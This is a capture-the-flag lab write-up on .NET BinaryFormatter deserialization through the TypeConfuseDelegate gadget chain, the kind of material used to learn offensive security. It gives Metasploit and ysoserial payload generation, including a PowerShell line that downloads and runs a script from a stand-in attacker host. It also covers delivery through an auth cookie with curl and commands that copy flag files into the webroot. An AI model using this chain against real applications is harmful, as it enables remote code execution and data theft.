# BinaryFormatter + TypeConfuseDelegate

These labs use .NET's `BinaryFormatter` deserializer. The key gadget chain here is TypeConfuseDelegate — it abuses how .NET's delegate comparison works to chain method calls into arbitrary code execution.

---

## Background: Why BinaryFormatter is Dangerous

`BinaryFormatter` in .NET deserializes objects by their full type name embedded in the serialized data. An attacker who controls the serialized payload can specify any type in any loaded assembly, including types that execute code in their constructors or property setters.

Microsoft deprecated BinaryFormatter in .NET 5+ and disabled it by default in .NET 7+, but it's still common in legacy apps.

---

## Lab 1 — TTAUTH Cookie

### Identifying the Attack Surface

The app sets a cookie called `TTAUTH`. Decoded from base64, it's a binary blob — the structure is recognizable as a BinaryFormatter stream (starts with `\x00\x01\x00\x00\x00`).

If the server deserializes this cookie to restore auth state, it's vulnerable.

### The Gadget Chain

Use the **TypeConfuseDelegate** chain via Metasploit's `Msf::Util::DotNetDeserialization`. This chain:
1. Creates a `SortedSet` with a `Comparer` delegate pointing to `Process.Start`
2. When deserialized, the comparison triggers `Process.Start` with attacker-controlled arguments

> Note: The `ObjectDataProvider` JSON gadget does NOT work here because the app is hosted in IIS/MTA (multithreaded apartment). ObjectDataProvider gadgets require STA COM threading. Stick with TypeConfuseDelegate.

### Generating the Payload

Using Metasploit's Ruby library:

```ruby
require 'msf/core/exploit/dotnet_deserialization'
include Msf::Exploit::DotNetDeserialization

# Generate a TypeConfuseDelegate payload that runs a command
payload = generate_dotnet_deserialization_payload(
  gadget_chain: :TypeConfuseDelegate,
  formatter:    :BinaryFormatter,
  clr_version:  :'v4',
  cmd:          'powershell -c "IEX(New-Object Net.WebClient).DownloadString(\'http://ATTACKER_IP/shell.ps1\')"'
)

puts Base64.strict_encode64(payload)
```

Or in Python using a pre-built ysoserial payload:

```bash
# Generate with ysoserial.net
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter \
  -c "powershell -enc BASE64_ENCODED_COMMAND" \
  -o base64
```

### Delivering the Payload

Set the `TTAUTH` cookie to the base64-encoded payload:

```bash
curl -s http://TARGET/auth/profile \
  -H "Cookie: TTAUTH=BASE64_PAYLOAD_HERE"
```

The server deserializes the cookie → gadget chain fires → your command runs.

### Reading the Flag

The command I used to read the flag (adjust path as needed):

```bash
# Command inside the payload:
cmd.exe /c type "C:\inetpub\wwwroot\flag.txt" > C:\Windows\Temp\out.txt

# Second request to retrieve the file:
# If there's a file read endpoint, use it. Otherwise, write to webroot.
cmd.exe /c type "C:\Windows\Temp\out.txt" > C:\inetpub\wwwroot\out.txt
```

Then `GET http://TARGET/out.txt`.

---

## Lab 2 — BinaryFormatter in Auth Cookie

Same chain, different flag location. Flag is at `C:\Program Files\IE\flag.txt`.

```bash
# Payload command:
cmd.exe /c type "C:\Program Files\IE\flag.txt" > C:\inetpub\wwwroot\flag_out.txt
```

Then read via HTTP. The chain and delivery are identical to Lab 1.

---

## General Notes

**Detecting BinaryFormatter payloads:**
- Cookie/token is base64 encoded
- Decoded bytes start with `\x00\x01\x00\x00\x00` (BinaryFormatter magic)
- Response changes when you send a malformed vs valid-looking payload

**Which gadget to use:**
- `TypeConfuseDelegate` — works everywhere, no COM threading requirement
- `ObjectDataProvider` — only works in STA threads (desktop apps, not IIS)
- `TextFormattingRunProperties` — works with BinaryFormatter in some specific contexts

**Troubleshooting:**
- If the payload doesn't fire, try wrapping the command in `cmd.exe /c "..."` instead of calling the binary directly
- Check if .NET version matters — generate for both v2 and v4
- If the server crashes instead of executing, the payload is being deserialized but the command is failing; check paths
